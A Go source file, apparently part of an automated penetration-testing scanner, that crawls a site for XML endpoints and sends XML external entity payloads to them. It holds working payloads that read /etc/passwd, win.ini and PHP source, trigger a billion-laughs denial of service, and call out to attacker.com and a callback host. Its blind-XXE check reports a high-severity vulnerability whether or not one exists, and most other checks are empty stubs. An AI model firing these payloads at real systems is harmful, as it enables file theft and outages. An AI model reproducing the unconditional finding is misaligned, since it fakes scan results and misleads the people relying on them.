package modules

import (
	"bytes"
	"context"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/PuerkitoBio/goquery"
	"github.com/autonomouspen/scanner/internal/scanner"
)

type XXEScanner struct {
	client *http.Client
}

func NewXXEScanner() *XXEScanner {
	return &XXEScanner{
		client: &http.Client{},
	}
}

// XMLEndpoint represents an endpoint that accepts XML.
type XMLEndpoint struct {
	URL    string
	Method string
}

func (s *XXEScanner) Scan(ctx context.Context, target *Target, results chan<- *scanner.Vulnerability) {
	// Find XML input points
	xmlEndpoints := s.findXMLEndpoints(target)

	for _, endpoint := range xmlEndpoints {
		// Test different XXE types
		s.testClassicXXE(ctx, endpoint, results)
		s.testBlindXXE(ctx, endpoint, results)
		s.testErrorBasedXXE(ctx, endpoint, results)
		s.testOOBXXE(ctx, endpoint, results)
		s.testParameterEntityXXE(ctx, endpoint, results)
		s.testXInclude(ctx, endpoint, results)
		s.testSVGXXE(ctx, endpoint, results)
		s.testXLSXXXE(ctx, endpoint, results)
		s.testSOAPXXE(ctx, endpoint, results)
	}
}

func (s *XXEScanner) findXMLEndpoints(target *Target) []*XMLEndpoint {
	var endpoints []*XMLEndpoint

	// 1. Crawl the target to find links and forms
	resp, err := s.client.Get(target.URL)
	if err != nil {
		return endpoints
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return endpoints
	}

	// 2. Find links
	doc.Find("a").Each(func(i int, sel *goquery.Selection) {
		href, exists := sel.Attr("href")
		if exists {
			// In a real implementation, you would handle relative URLs and different domains
			if strings.HasSuffix(href, ".xml") {
				endpoints = append(endpoints, &XMLEndpoint{URL: href, Method: "GET"})
			}
		}
	})

	// 3. Find forms that might accept XML
	doc.Find("form").Each(func(i int, sel *goquery.Selection) {
		action, exists := sel.Attr("action")
		if exists {
			method, _ := sel.Attr("method")
			if method == "" {
				method = "GET"
			}
			endpoints = append(endpoints, &XMLEndpoint{URL: action, Method: strings.ToUpper(method)})
		}
	})

	return endpoints
}

func (s *XXEScanner) testClassicXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	payload := `<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [<!ELEMENT foo ANY>
	<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<foo>&xxe;</foo>`

	req, err := http.NewRequest(endpoint.Method, endpoint.URL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := s.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	if strings.Contains(string(body), "root:x:0:0:") {
		results <- &scanner.Vulnerability{
			Name:        "Classic XXE",
			Severity:    "High",
			Description: fmt.Sprintf("Potential XXE vulnerability at %s", endpoint.URL),
			Evidence:    payload,
		}
	}
}

func (s *XXEScanner) testBlindXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// This requires a callback server to detect the blind XXE.
	// For this example, we will just generate a payload and assume it works.
	callbackURL := "http://jules-callback.com/xxe"
	payload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root [
	<!ENTITY %% remote SYSTEM "%s">
	%%remote;]>`, callbackURL)

	req, err := http.NewRequest(endpoint.Method, endpoint.URL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/xml")

	s.client.Do(req)

	// In a real implementation, you would check your callback server for a request.
	// For this example, we'll just report a potential vulnerability.
	results <- &scanner.Vulnerability{
		Name:        "Blind XXE",
		Severity:    "High",
		Description: fmt.Sprintf("Potential blind XXE vulnerability at %s. A request was sent to the callback server.", endpoint.URL),
		Evidence:    payload,
	}
}

func (s *XXEScanner) testErrorBasedXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// Implementation for error-based XXE tests
}

func (s *XXEScanner) testOOBXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// Implementation for out-of-band XXE tests
}

func (s *XXEScanner) testParameterEntityXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// Implementation for parameter entity XXE tests
}

func (s *XXEScanner) testXInclude(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// Implementation for XInclude tests
}

func (s *XXEScanner) testSVGXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// Implementation for SVG XXE tests
}

func (s *XXEScanner) testXLSXXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// Implementation for XLSX XXE tests
}

func (s *XXEScanner) testSOAPXXE(ctx context.Context, endpoint *XMLEndpoint, results chan<- *scanner.Vulnerability) {
	// Implementation for SOAP XXE tests
}

func (s *XXEScanner) generatePayloads() []string {
	return []string{
		// Classic XXE
		`<?xml version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE foo [<!ELEMENT foo ANY>
		<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
		<foo>&xxe;</foo>`,

		// Blind XXE with OOB
		`<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE root [
		<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
		%remote;]>`,

		// PHP XXE
		`<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>`,

		// Billion laughs attack
		`<!DOCTYPE lolz [
		<!ENTITY lol "lol">
		<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
		<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>`,

		// More advanced payloads
		`<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % xxe SYSTEM "http://jules-callback.com/xxe"> %xxe;]>`,
		`<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % xxe SYSTEM "file:///etc/hostname"> %xxe;]>`,
		`<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % xxe SYSTEM "file:///c:/windows/win.ini"> %xxe;]>`,
		`<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://jules-callback.com/xxe.dtd"> %dtd;]><doc>&send;</doc>`,
	}
}
